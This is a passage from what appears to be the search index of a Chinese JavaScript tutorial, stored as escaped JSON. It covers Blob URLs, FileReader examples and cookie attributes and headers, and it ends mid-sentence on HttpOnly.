\u5bf9\u8c61\u4e0d\u5b58\u5728\uff0c\u8fd4\u56de404\u72b6\u6001\u7801\uff1b\u5982\u679c\u8de8\u57df\u8bf7\u6c42\uff0c\u8fd4\u56de403\u72b6\u6001\u7801\u3002Blob URL \u53ea\u5bf9 GET \u8bf7\u6c42\u6709\u6548\uff0c\u5982\u679c\u8bf7\u6c42\u6210\u529f\uff0c\u8fd4\u56de200\u72b6\u6001\u7801\u3002\u7531\u4e8e Blob URL \u5c31\u662f\u666e\u901a URL\uff0c\u56e0\u6b64\u53ef\u4ee5\u4e0b\u8f7d\u3002","title":"\u751f\u6210 URL"},{"location":"bom/arraybuffer/#_5","text":"\u53d6\u5f97 Blob \u5bf9\u8c61\u4ee5\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7 FileReader \u5bf9\u8c61\uff0c\u8bfb\u53d6 Blob \u5bf9\u8c61\u7684\u5185\u5bb9\uff0c\u5373\u6587\u4ef6\u5185\u5bb9\u3002 FileReader \u5bf9\u8c61\u63d0\u4f9b\u56db\u4e2a\u65b9\u6cd5\uff0c\u5904\u7406 Blob \u5bf9\u8c61\u3002Blob \u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u4f20\u5165\u8fd9\u4e9b\u65b9\u6cd5\uff0c\u7136\u540e\u4ee5\u6307\u5b9a\u7684\u683c\u5f0f\u8fd4\u56de\u3002 FileReader.readAsText() \uff1a\u8fd4\u56de\u6587\u672c\uff0c\u9700\u8981\u6307\u5b9a\u6587\u672c\u7f16\u7801\uff0c\u9ed8\u8ba4\u4e3a UTF-8\u3002 FileReader.readAsArrayBuffer() \uff1a\u8fd4\u56de ArrayBuffer \u5bf9\u8c61\u3002 FileReader.readAsDataURL() \uff1a\u8fd4\u56de Data URL\u3002 FileReader.readAsBinaryString() \uff1a\u8fd4\u56de\u539f\u59cb\u7684\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u3002 \u4e0b\u9762\u662f FileReader.readAsText() \u65b9\u6cd5\u7684\u4f8b\u5b50\uff0c\u7528\u6765\u8bfb\u53d6\u6587\u672c\u6587\u4ef6\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // HTML \u4ee3\u7801\u5982\u4e0b // <input type=\"file\" onchange=\"readfile(this.files[0])\"></input> // <pre id=\"output\"></pre> function readfile ( f ) { var reader = new FileReader (); reader . readAsText ( f ); reader . onload = function () { var text = reader . result ; var out = document . getElementById ( 'output' ); out . innerHTML = '' ; out . appendChild ( document . createTextNode ( text )); } reader . onerror = function ( e ) { console . log ( 'Error' , e ); }; } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u901a\u8fc7\u6307\u5b9a FileReader \u5b9e\u4f8b\u5bf9\u8c61\u7684 onload \u76d1\u542c\u51fd\u6570\uff0c\u5728\u5b9e\u4f8b\u7684 result \u5c5e\u6027\u4e0a\u62ff\u5230\u6587\u4ef6\u5185\u5bb9\u3002 \u4e0b\u9762\u662f FileReader.readAsArrayBuffer() \u65b9\u6cd5\u7684\u4f8b\u5b50\uff0c\u7528\u4e8e\u8bfb\u53d6\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // HTML \u4ee3\u7801\u5982\u4e0b // <input type=\"file\" onchange=\"typefile(this.files[0])\"></input> function typefile ( file ) { // \u6587\u4ef6\u5f00\u5934\u7684\u56db\u4e2a\u5b57\u8282\uff0c\u751f\u6210\u4e00\u4e2a Blob \u5bf9\u8c61 var slice = file . slice ( 0 , 4 ); var reader = new FileReader (); // \u8bfb\u53d6\u8fd9\u56db\u4e2a\u5b57\u8282 reader . readAsArrayBuffer ( slice ); reader . onload = function ( e ) { var buffer = reader . result ; // \u5c06\u8fd9\u56db\u4e2a\u5b57\u8282\u7684\u5185\u5bb9\uff0c\u89c6\u4f5c\u4e00\u4e2a32\u4f4d\u6574\u6570 var view = new DataView ( buffer ); var magic = view . getUint32 ( 0 , false ); // \u6839\u636e\u6587\u4ef6\u7684\u524d\u56db\u4e2a\u5b57\u8282\uff0c\u5224\u65ad\u5b83\u7684\u7c7b\u578b switch ( magic ) { case 0x89504E47 : file . verified_type = 'image/png' ; break ; case 0x47494638 : file . verified_type = 'image/gif' ; break ; case 0x25504446 : file . verified_type = 'application/pdf' ; break ; case 0x504b0304 : file . verified_type = 'application/zip' ; break ; } console . log ( file . name , file . verified_type ); }; }","title":"\u8bfb\u53d6\u6587\u4ef6"},{"location":"bom/cookie/","text":"Cookie \u00b6 \u6982\u8ff0 \u00b6 Cookie \u662f\u670d\u52a1\u5668\u4fdd\u5b58\u5728\u6d4f\u89c8\u5668\u7684\u4e00\u5c0f\u6bb5\u6587\u672c\u4fe1\u606f\uff0c\u4e00\u822c\u5927\u5c0f\u4e0d\u80fd\u8d85\u8fc74KB\u3002\u6d4f\u89c8\u5668\u6bcf\u6b21\u5411\u670d\u52a1\u5668\u53d1\u51fa\u8bf7\u6c42\uff0c\u5c31\u4f1a\u81ea\u52a8\u9644\u4e0a\u8fd9\u6bb5\u4fe1\u606f\u3002 HTTP \u534f\u8bae\u4e0d\u5e26\u6709\u72b6\u6001\uff0c\u6709\u4e9b\u8bf7\u6c42\u9700\u8981\u533a\u5206\u72b6\u6001\uff0c\u5c31\u901a\u8fc7 Cookie \u9644\u5e26\u5b57\u7b26\u4e32\uff0c\u8ba9\u670d\u52a1\u5668\u8fd4\u56de\u4e0d\u4e00\u6837\u7684\u56de\u5e94\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u7528\u6237\u767b\u5f55\u4ee5\u540e\uff0c\u670d\u52a1\u5668\u5f80\u5f80\u4f1a\u5728\u7f51\u7ad9\u4e0a\u7559\u4e0b\u4e00\u4e2a Cookie\uff0c\u8bb0\u5f55\u7528\u6237\u7f16\u53f7\uff08\u6bd4\u5982 id=1234 \uff09\uff0c\u4ee5\u540e\u6bcf\u6b21\u6d4f\u89c8\u5668\u5411\u670d\u52a1\u5668\u8bf7\u6c42\u6570\u636e\uff0c\u5c31\u4f1a\u5e26\u4e0a\u8fd9\u4e2a\u5b57\u7b26\u4e32\uff0c\u670d\u52a1\u5668\u4ece\u800c\u77e5\u9053\u662f\u8c01\u5728\u8bf7\u6c42\uff0c\u5e94\u8be5\u56de\u5e94\u4ec0\u4e48\u5185\u5bb9\u3002 Cookie \u7684\u76ee\u7684\u5c31\u662f\u533a\u5206\u7528\u6237\uff0c\u4ee5\u53ca\u653e\u7f6e\u72b6\u6001\u4fe1\u606f\uff0c\u5b83\u7684\u4f7f\u7528\u573a\u666f\u4e3b\u8981\u5982\u4e0b\u3002 \u5bf9\u8bdd\uff08session\uff09\u7ba1\u7406\uff1a\u4fdd\u5b58\u767b\u5f55\u72b6\u6001\u3001\u8d2d\u7269\u8f66\u7b49\u9700\u8981\u8bb0\u5f55\u7684\u4fe1\u606f\u3002 \u4e2a\u6027\u5316\u4fe1\u606f\uff1a\u4fdd\u5b58\u7528\u6237\u7684\u504f\u597d\uff0c\u6bd4\u5982\u7f51\u9875\u7684\u5b57\u4f53\u5927\u5c0f\u3001\u80cc\u666f\u8272\u7b49\u7b49\u3002 \u8ffd\u8e2a\u7528\u6237\uff1a\u8bb0\u5f55\u548c\u5206\u6790\u7528\u6237\u884c\u4e3a\u3002 Cookie \u4e0d\u662f\u4e00\u79cd\u7406\u60f3\u7684\u5ba2\u6237\u7aef\u5b58\u50a8\u673a\u5236\u3002\u5b83\u7684\u5bb9\u91cf\u5f88\u5c0f\uff084KB\uff09\uff0c\u7f3a\u4e4f\u6570\u636e\u64cd\u4f5c\u63a5\u53e3\uff0c\u800c\u4e14\u4f1a\u5f71\u54cd\u6027\u80fd\u3002\u5ba2\u6237\u7aef\u5b58\u50a8\u5efa\u8bae\u4f7f\u7528 Web storage API \u548c IndexedDB\u3002\u53ea\u6709\u90a3\u4e9b\u6bcf\u6b21\u8bf7\u6c42\u90fd\u9700\u8981\u8ba9\u670d\u52a1\u5668\u77e5\u9053\u7684\u4fe1\u606f\uff0c\u624d\u5e94\u8be5\u653e\u5728 Cookie \u91cc\u9762\u3002 \u6bcf\u4e2a Cookie \u90fd\u6709\u4ee5\u4e0b\u51e0\u65b9\u9762\u7684\u5143\u6570\u636e\u3002 Cookie \u7684\u540d\u5b57 Cookie \u7684\u503c\uff08\u771f\u6b63\u7684\u6570\u636e\u5199\u5728\u8fd9\u91cc\u9762\uff09 \u5230\u671f\u65f6\u95f4\uff08\u8d85\u8fc7\u8fd9\u4e2a\u65f6\u95f4\u4f1a\u5931\u6548\uff09 \u6240\u5c5e\u57df\u540d\uff08\u9ed8\u8ba4\u4e3a\u5f53\u524d\u57df\u540d\uff09 \u751f\u6548\u7684\u8def\u5f84\uff08\u9ed8\u8ba4\u4e3a\u5f53\u524d\u7f51\u5740\uff09 \u4e3e\u4f8b\u6765\u8bf4\uff0c\u7528\u6237\u8bbf\u95ee\u7f51\u5740 www.example.com \uff0c\u670d\u52a1\u5668\u5728\u6d4f\u89c8\u5668\u5199\u5165\u4e00\u4e2a Cookie\u3002\u8fd9\u4e2a Cookie \u7684\u6240\u5c5e\u57df\u540d\u4e3a www.example.com \uff0c\u751f\u6548\u8def\u5f84\u4e3a\u6839\u8def\u5f84 / \u3002 \u5982\u679c Cookie \u7684\u751f\u6548\u8def\u5f84\u8bbe\u4e3a /forums \uff0c\u90a3\u4e48\u8fd9\u4e2a Cookie \u53ea\u6709\u5728\u8bbf\u95ee www.example.com/forums \u53ca\u5176\u5b50\u8def\u5f84\u65f6\u624d\u6709\u6548\u3002\u4ee5\u540e\uff0c\u6d4f\u89c8\u5668\u8bbf\u95ee\u67d0\u4e2a\u8def\u5f84\u4e4b\u524d\uff0c\u5c31\u4f1a\u627e\u51fa\u5bf9\u8be5\u57df\u540d\u548c\u8def\u5f84\u6709\u6548\uff0c\u5e76\u4e14\u8fd8\u6ca1\u6709\u5230\u671f\u7684 Cookie\uff0c\u4e00\u8d77\u53d1\u9001\u7ed9\u670d\u52a1\u5668\u3002 \u7528\u6237\u53ef\u4ee5\u8bbe\u7f6e\u6d4f\u89c8\u5668\u4e0d\u63a5\u53d7 Cookie\uff0c\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u4e0d\u5411\u670d\u52a1\u5668\u53d1\u9001 Cookie\u3002 window.navigator.cookieEnabled \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u6d4f\u89c8\u5668\u662f\u5426\u6253\u5f00 Cookie \u529f\u80fd\u3002 1 window . navigator . cookieEnabled // true document.cookie \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u7f51\u9875\u7684 Cookie\u3002 1 document . cookie // \"id=foo;key=bar\" \u4e0d\u540c\u6d4f\u89c8\u5668\u5bf9 Cookie \u6570\u91cf\u548c\u5927\u5c0f\u7684\u9650\u5236\uff0c\u662f\u4e0d\u4e00\u6837\u7684\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5355\u4e2a\u57df\u540d\u8bbe\u7f6e\u7684 Cookie \u4e0d\u5e94\u8d85\u8fc730\u4e2a\uff0c\u6bcf\u4e2a Cookie \u7684\u5927\u5c0f\u4e0d\u80fd\u8d85\u8fc7 4KB\u3002\u8d85\u8fc7\u9650\u5236\u4ee5\u540e\uff0cCookie \u5c06\u88ab\u5ffd\u7565\uff0c\u4e0d\u4f1a\u88ab\u8bbe\u7f6e\u3002 Cookie \u662f\u6309\u7167\u57df\u540d\u533a\u5206\u7684\uff0c foo.com \u53ea\u80fd\u8bfb\u53d6\u81ea\u5df1\u653e\u7f6e\u7684 Cookie\uff0c\u65e0\u6cd5\u8bfb\u53d6\u5176\u4ed6\u7f51\u7ad9\uff08\u6bd4\u5982 bar.com \uff09\u653e\u7f6e\u7684 Cookie\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u4e00\u7ea7\u57df\u540d\u4e5f\u4e0d\u80fd\u8bfb\u53d6\u4e8c\u7ea7\u57df\u540d\u7559\u4e0b\u7684 Cookie\uff0c\u6bd4\u5982 mydomain.com \u4e0d\u80fd\u8bfb\u53d6 subdomain.mydomain.com \u8bbe\u7f6e\u7684 Cookie\u3002\u4f46\u662f\u6709\u4e00\u4e2a\u4f8b\u5916\uff0c\u8bbe\u7f6e Cookie \u7684\u65f6\u5019\uff08\u4e0d\u7ba1\u662f\u4e00\u7ea7\u57df\u540d\u8bbe\u7f6e\u7684\uff0c\u8fd8\u662f\u4e8c\u7ea7\u57df\u540d\u8bbe\u7f6e\u7684\uff09\uff0c\u660e\u786e\u5c06 domain \u5c5e\u6027\u8bbe\u4e3a\u4e00\u7ea7\u57df\u540d\uff0c\u5219\u8fd9\u4e2a\u57df\u540d\u4e0b\u9762\u7684\u5404\u7ea7\u57df\u540d\u53ef\u4ee5\u5171\u4eab\u8fd9\u4e2a Cookie\u3002 1 Set-Cookie: name=value; domain=mydomain.com \u4e0a\u9762\u793a\u4f8b\u4e2d\uff0c\u8bbe\u7f6e Cookie \u65f6\uff0c domain \u5c5e\u6027\u8bbe\u4e3a mydomain.com \uff0c\u90a3\u4e48\u5404\u7ea7\u7684\u5b50\u57df\u540d\u548c\u4e00\u7ea7\u57df\u540d\u90fd\u53ef\u4ee5\u8bfb\u53d6\u8fd9\u4e2a Cookie\u3002 \u6ce8\u610f\uff0c\u533a\u5206 Cookie \u65f6\u4e0d\u8003\u8651\u534f\u8bae\u548c\u7aef\u53e3\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c http://example.com \u8bbe\u7f6e\u7684 Cookie\uff0c\u53ef\u4ee5\u88ab https://example.com \u6216 http://example.com:8080 \u8bfb\u53d6\u3002 Cookie \u4e0e HTTP \u534f\u8bae \u00b6 Cookie \u7531 HTTP \u534f\u8bae\u751f\u6210\uff0c\u4e5f\u4e3b\u8981\u662f\u4f9b HTTP \u534f\u8bae\u4f7f\u7528\u3002 HTTP \u56de\u5e94\uff1aCookie \u7684\u751f\u6210 \u00b6 \u670d\u52a1\u5668\u5982\u679c\u5e0c\u671b\u5728\u6d4f\u89c8\u5668\u4fdd\u5b58 Cookie\uff0c\u5c31\u8981\u5728 HTTP \u56de\u5e94\u7684\u5934\u4fe1\u606f\u91cc\u9762\uff0c\u653e\u7f6e\u4e00\u4e2a Set-Cookie \u5b57\u6bb5\u3002 1 Set-Cookie:foo=bar \u4e0a\u9762\u4ee3\u7801\u4f1a\u5728\u6d4f\u89c8\u5668\u4fdd\u5b58\u4e00\u4e2a\u540d\u4e3a foo \u7684 Cookie\uff0c\u5b83\u7684\u503c\u4e3a bar \u3002 HTTP \u56de\u5e94\u53ef\u4ee5\u5305\u542b\u591a\u4e2a Set-Cookie \u5b57\u6bb5\uff0c\u5373\u5728\u6d4f\u89c8\u5668\u751f\u6210\u591a\u4e2a Cookie\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 HTTP / 1.0 200 OK Content-type : text/html Set-Cookie : yummy_cookie=choco Set-Cookie : tasty_cookie=strawberry [page content] \u9664\u4e86 Cookie \u7684\u503c\uff0c Set-Cookie \u5b57\u6bb5\u8fd8\u53ef\u4ee5\u9644\u52a0 Cookie \u7684\u5c5e\u6027\u3002 1 2 3 4 5 6 Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date> Set-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit> Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value> Set-Cookie: <cookie-name>=<cookie-value>; Path=<path-value> Set-Cookie: <cookie-name>=<cookie-value>; Secure Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly \u4e0a\u9762\u7684\u51e0\u4e2a\u5c5e\u6027\u7684\u542b\u4e49\uff0c\u5c06\u5728\u540e\u6587\u89e3\u91ca\u3002 \u4e00\u4e2a Set-Cookie \u5b57\u6bb5\u91cc\u9762\uff0c\u53ef\u4ee5\u540c\u65f6\u5305\u62ec\u591a\u4e2a\u5c5e\u6027\uff0c\u6ca1\u6709\u6b21\u5e8f\u7684\u8981\u6c42\u3002 1 Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly \u5982\u679c\u670d\u52a1\u5668\u60f3\u6539\u53d8\u4e00\u4e2a\u65e9\u5148\u8bbe\u7f6e\u7684 Cookie\uff0c\u5fc5\u987b\u540c\u65f6\u6ee1\u8db3\u56db\u4e2a\u6761\u4ef6\uff1aCookie \u7684 key \u3001 domain \u3001 path \u548c secure \u90fd\u5339\u914d\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u5982\u679c\u539f\u59cb\u7684 Cookie \u662f\u7528\u5982\u4e0b\u7684 Set-Cookie \u8bbe\u7f6e\u7684\u3002 1 Set-Cookie: key1=value1; domain=example.com; path=/blog \u6539\u53d8\u4e0a\u9762\u8fd9\u4e2a Cookie \u7684\u503c\uff0c\u5c31\u5fc5\u987b\u4f7f\u7528\u540c\u6837\u7684 Set-Cookie \u3002 1 Set-Cookie: key1=value2; domain=example.com; path=/blog \u53ea\u8981\u6709\u4e00\u4e2a\u5c5e\u6027\u4e0d\u540c\uff0c\u5c31\u4f1a\u751f\u6210\u4e00\u4e2a\u5168\u65b0\u7684 Cookie\uff0c\u800c\u4e0d\u662f\u66ff\u6362\u6389\u539f\u6765\u90a3\u4e2a Cookie\u3002 1 Set-Cookie: key1=value2; domain=example.com; path=/ \u4e0a\u9762\u7684\u547d\u4ee4\u8bbe\u7f6e\u4e86\u4e00\u4e2a\u5168\u65b0\u7684\u540c\u540d Cookie\uff0c\u4f46\u662f path \u5c5e\u6027\u4e0d\u4e00\u6837\u3002\u4e0b\u4e00\u6b21\u8bbf\u95ee example.com/blog \u7684\u65f6\u5019\uff0c\u6d4f\u89c8\u5668\u5c06\u5411\u670d\u52a1\u5668\u53d1\u9001\u4e24\u4e2a\u540c\u540d\u7684 Cookie\u3002 1 Cookie: key1=value1; key1=value2 \u4e0a\u9762\u4ee3\u7801\u7684\u4e24\u4e2a Cookie \u662f\u540c\u540d\u7684\uff0c\u5339\u914d\u8d8a\u7cbe\u786e\u7684 Cookie \u6392\u5728\u8d8a\u524d\u9762\u3002 HTTP \u8bf7\u6c42\uff1aCookie \u7684\u53d1\u9001 \u00b6 \u6d4f\u89c8\u5668\u5411\u670d\u52a1\u5668\u53d1\u9001 HTTP \u8bf7\u6c42\u65f6\uff0c\u6bcf\u4e2a\u8bf7\u6c42\u90fd\u4f1a\u5e26\u4e0a\u76f8\u5e94\u7684 Cookie\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u628a\u670d\u52a1\u5668\u65e9\u524d\u4fdd\u5b58\u5728\u6d4f\u89c8\u5668\u7684\u8fd9\u6bb5\u4fe1\u606f\uff0c\u518d\u53d1\u56de\u670d\u52a1\u5668\u3002\u8fd9\u65f6\u8981\u4f7f\u7528 HTTP \u5934\u4fe1\u606f\u7684 Cookie \u5b57\u6bb5\u3002 1 Cookie: foo=bar \u4e0a\u9762\u4ee3\u7801\u4f1a\u5411\u670d\u52a1\u5668\u53d1\u9001\u540d\u4e3a foo \u7684 Cookie\uff0c\u503c\u4e3a bar \u3002 Cookie \u5b57\u6bb5\u53ef\u4ee5\u5305\u542b\u591a\u4e2a Cookie\uff0c\u4f7f\u7528\u5206\u53f7\uff08 ; \uff09\u5206\u9694\u3002 1 Cookie: name=value; name2=value2; name3=value3 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 GET /sample_page.html HTTP / 1.1 Host : www.example.org Cookie : yummy_cookie=choco; tasty_cookie=strawberry \u670d\u52a1\u5668\u6536\u5230\u6d4f\u89c8\u5668\u53d1\u6765\u7684 Cookie \u65f6\uff0c\u6709\u4e24\u70b9\u662f\u65e0\u6cd5\u77e5\u9053\u7684\u3002 Cookie \u7684\u5404\u79cd\u5c5e\u6027\uff0c\u6bd4\u5982\u4f55\u65f6\u8fc7\u671f\u3002 \u54ea\u4e2a\u57df\u540d\u8bbe\u7f6e\u7684 Cookie\uff0c\u5230\u5e95\u662f\u4e00\u7ea7\u57df\u540d\u8bbe\u7684\uff0c\u8fd8\u662f\u67d0\u4e00\u4e2a\u4e8c\u7ea7\u57df\u540d\u8bbe\u7684\u3002 Cookie \u7684\u5c5e\u6027 \u00b6 Expires\uff0cMax-Age \u00b6 Expires \u5c5e\u6027\u6307\u5b9a\u4e00\u4e2a\u5177\u4f53\u7684\u5230\u671f\u65f6\u95f4\uff0c\u5230\u4e86\u6307\u5b9a\u65f6\u95f4\u4ee5\u540e\uff0c\u6d4f\u89c8\u5668\u5c31\u4e0d\u518d\u4fdd\u7559\u8fd9\u4e2a Cookie\u3002\u5b83\u7684\u503c\u662f UTC \u683c\u5f0f\uff0c\u53ef\u4ee5\u4f7f\u7528 Date.prototype.toUTCString() \u8fdb\u884c\u683c\u5f0f\u8f6c\u6362\u3002 1 Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; \u5982\u679c\u4e0d\u8bbe\u7f6e\u8be5\u5c5e\u6027\uff0c\u6216\u8005\u8bbe\u4e3a null \uff0cCookie \u53ea\u5728\u5f53\u524d\u4f1a\u8bdd\uff08session\uff09\u6709\u6548\uff0c\u6d4f\u89c8\u5668\u7a97\u53e3\u4e00\u65e6\u5173\u95ed\uff0c\u5f53\u524d Session \u7ed3\u675f\uff0c\u8be5 Cookie \u5c31\u4f1a\u88ab\u5220\u9664\u3002\u53e6\u5916\uff0c\u6d4f\u89c8\u5668\u6839\u636e\u672c\u5730\u65f6\u95f4\uff0c\u51b3\u5b9a Cookie \u662f\u5426\u8fc7\u671f\uff0c\u7531\u4e8e\u672c\u5730\u65f6\u95f4\u662f\u4e0d\u7cbe\u786e\u7684\uff0c\u6240\u4ee5\u6ca1\u6709\u529e\u6cd5\u4fdd\u8bc1 Cookie \u4e00\u5b9a\u4f1a\u5728\u670d\u52a1\u5668\u6307\u5b9a\u7684\u65f6\u95f4\u8fc7\u671f\u3002 Max-Age \u5c5e\u6027\u6307\u5b9a\u4ece\u73b0\u5728\u5f00\u59cb Cookie \u5b58\u5728\u7684\u79d2\u6570\uff0c\u6bd4\u5982 60 * 60 * 24 * 365 \uff08\u5373\u4e00\u5e74\uff09\u3002\u8fc7\u4e86\u8fd9\u4e2a\u65f6\u95f4\u4ee5\u540e\uff0c\u6d4f\u89c8\u5668\u5c31\u4e0d\u518d\u4fdd\u7559\u8fd9\u4e2a Cookie\u3002 \u5982\u679c\u540c\u65f6\u6307\u5b9a\u4e86 Expires \u548c Max-Age \uff0c\u90a3\u4e48 Max-Age \u7684\u503c\u5c06\u4f18\u5148\u751f\u6548\u3002 \u5982\u679c Set-Cookie \u5b57\u6bb5\u6ca1\u6709\u6307\u5b9a Expires \u6216 Max-Age \u5c5e\u6027\uff0c\u90a3\u4e48\u8fd9\u4e2a Cookie \u5c31\u662f Session Cookie\uff0c\u5373\u5b83\u53ea\u5728\u672c\u6b21\u5bf9\u8bdd\u5b58\u5728\uff0c\u4e00\u65e6\u7528\u6237\u5173\u95ed\u6d4f\u89c8\u5668\uff0c\u6d4f\u89c8\u5668\u5c31\u4e0d\u4f1a\u518d\u4fdd\u7559\u8fd9\u4e2a Cookie\u3002 Domain\uff0cPath \u00b6 Domain \u5c5e\u6027\u6307\u5b9a Cookie \u5c5e\u4e8e\u54ea\u4e2a\u57df\u540d\uff0c\u4ee5\u540e\u6d4f\u89c8\u5668\u5411\u670d\u52a1\u5668\u53d1\u9001 HTTP \u8bf7\u6c42\u65f6\uff0c\u901a\u8fc7\u8fd9\u4e2a\u5c5e\u6027\u5224\u65ad\u662f\u5426\u8981\u9644\u5e26\u67d0\u4e2a Cookie\u3002 \u670d\u52a1\u5668\u8bbe\u5b9a Cookie \u65f6\uff0c\u5982\u679c\u6ca1\u6709\u6307\u5b9a Domain \u5c5e\u6027\uff0c\u6d4f\u89c8\u5668\u4f1a\u9ed8\u8ba4\u5c06\u5176\u8bbe\u4e3a\u6d4f\u89c8\u5668\u7684\u5f53\u524d\u57df\u540d\u3002\u5982\u679c\u5f53\u524d\u57df\u540d\u662f\u4e00\u4e2a IP \u5730\u5740\uff0c\u5219\u4e0d\u5f97\u8bbe\u7f6e Domain \u5c5e\u6027\u3002 \u5982\u679c\u6307\u5b9a Domain \u5c5e\u6027\uff0c\u9700\u8981\u9075\u5b88\u4e0b\u9762\u89c4\u5219\uff1aDomain \u5c5e\u6027\u53ea\u80fd\u662f\u5f53\u524d\u57df\u540d\u6216\u8005\u5f53\u524d\u57df\u540d\u7684\u4e0a\u7ea7\u57df\u540d\uff0c\u4f46\u8bbe\u4e3a\u4e0a\u7ea7\u57df\u540d\u65f6\uff0c\u4e0d\u80fd\u8bbe\u4e3a\u9876\u7ea7\u57df\u540d\u6216\u516c\u5171\u57df\u540d\u3002\uff08\u9876\u7ea7\u57df\u540d\u6307\u7684\u662f .com\u3001.net \u8fd9\u6837\u7684\u57df\u540d\uff0c\u516c\u5171\u57df\u540d\u6307\u7684\u662f\u5f00\u653e\u7ed9\u5916\u90e8\u7528\u6237\u8bbe\u7f6e\u5b50\u57df\u540d\u7684\u57df\u540d\uff0c\u6bd4\u5982 github.io\u3002\uff09\u5982\u679c\u4e0d\u7b26\u5408\u4e0a\u9762\u8fd9\u6761\u89c4\u5219\uff0c\u6d4f\u89c8\u5668\u4f1a\u62d2\u7edd\u8bbe\u7f6e\u8fd9\u4e2a Cookie\u3002 \u4e3e\u4f8b\u6765\u8bf4\uff0c\u5f53\u524d\u57df\u540d\u4e3a x.y.z.com \uff0c\u90a3\u4e48 Domain \u5c5e\u6027\u53ef\u4ee5\u8bbe\u4e3a x.y.z.com \uff0c\u6216\u8005 y.z.com \uff0c\u6216\u8005 z.com \uff0c\u4f46\u4e0d\u80fd\u8bbe\u4e3a foo.x.y.z.com \uff0c\u6216\u8005 another.domain.com \u3002 \u53e6\u4e00\u4e2a\u4f8b\u5b50\u662f\uff0c\u5f53\u524d\u57df\u540d\u4e3a wangdoc.github.io \uff0c\u5219 Domain \u5c5e\u6027\u53ea\u80fd\u8bbe\u4e3a wangdoc.github.io \uff0c\u4e0d\u80fd\u8bbe\u4e3a github.io \uff0c\u56e0\u4e3a\u540e\u8005\u662f\u4e00\u4e2a\u516c\u5171\u57df\u540d\u3002 \u6d4f\u89c8\u5668\u53d1\u9001 Cookie \u65f6\uff0cDomain \u5c5e\u6027\u5fc5\u987b\u4e0e\u5f53\u524d\u57df\u540d\u4e00\u81f4\uff0c\u6216\u8005\u662f\u5f53\u524d\u57df\u540d\u7684\u4e0a\u7ea7\u57df\u540d\uff08\u516c\u5171\u57df\u540d\u9664\u5916\uff09\u3002\u6bd4\u5982\uff0cDomain \u5c5e\u6027\u662f y.z.com \uff0c\u90a3\u4e48\u9002\u7528\u4e8e y.z.com \u3001 x.y.z.com \u3001 foo.x.y.z.com \u7b49\u57df\u540d\u3002\u518d\u6bd4\u5982\uff0cDomain \u5c5e\u6027\u662f\u516c\u5171\u57df\u540d github.io \uff0c\u90a3\u4e48\u53ea\u9002\u7528\u4e8e github.io \u8fd9\u4e2a\u57df\u540d\u672c\u8eab\uff0c\u4e0d\u9002\u7528\u4e8e\u5b83\u7684\u5b50\u57df\u540d wangdoc.github.io \u3002 Path \u5c5e\u6027\u6307\u5b9a\u6d4f\u89c8\u5668\u53d1\u51fa HTTP \u8bf7\u6c42\u65f6\uff0c\u54ea\u4e9b\u8def\u5f84\u8981\u9644\u5e26\u8fd9\u4e2a Cookie\u3002\u53ea\u8981\u6d4f\u89c8\u5668\u53d1\u73b0\uff0c Path \u5c5e\u6027\u662f HTTP \u8bf7\u6c42\u8def\u5f84\u7684\u5f00\u5934\u4e00\u90e8\u5206\uff0c\u5c31\u4f1a\u5728\u5934\u4fe1\u606f\u91cc\u9762\u5e26\u4e0a\u8fd9\u4e2a Cookie\u3002\u6bd4\u5982\uff0c Path \u5c5e\u6027\u662f / \uff0c\u90a3\u4e48\u8bf7\u6c42 /docs \u8def\u5f84\u4e5f\u4f1a\u5305\u542b\u8be5 Cookie\u3002\u5f53\u7136\uff0c\u524d\u63d0\u662f Domain \u5c5e\u6027\u5fc5\u987b\u7b26\u5408\u6761\u4ef6\u3002 Secure\uff0cHttpOnly \u00b6 Secure \u5c5e\u6027\u6307\u5b9a\u6d4f\u89c8\u5668\u53ea\u6709\u5728\u52a0\u5bc6\u534f\u8bae HTTPS \u4e0b\uff0c\u624d\u80fd\u5c06\u8fd9\u4e2a Cookie \u53d1\u9001\u5230\u670d\u52a1\u5668\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u5982\u679c\u5f53\u524d\u534f\u8bae\u662f HTTP\uff0c\u6d4f\u89c8\u5668\u4f1a\u81ea\u52a8\u5ffd\u7565\u670d\u52a1\u5668\u53d1\u6765\u7684 Secure \u5c5e\u6027\u3002\u8be5\u5c5e\u6027\u53ea\u662f\u4e00\u4e2a\u5f00\u5173\uff0c\u4e0d\u9700\u8981\u6307\u5b9a\u503c\u3002\u5982\u679c\u901a\u4fe1\u662f HTTPS \u534f\u8bae\uff0c\u8be5\u5f00\u5173\u81ea\u52a8\u6253\u5f00\u3002 HttpOnly \u5c5e\u6027\u6307\u5b9a\u8be5 Cookie \u65e0\u6cd5\u901a\u8fc7 JavaScript \u811a\u672c\u62ff\u5230\uff0c\u4e3b\u8981\u662f document.cookie \u5c5e\u6027\u3001 XMLHttpRequest 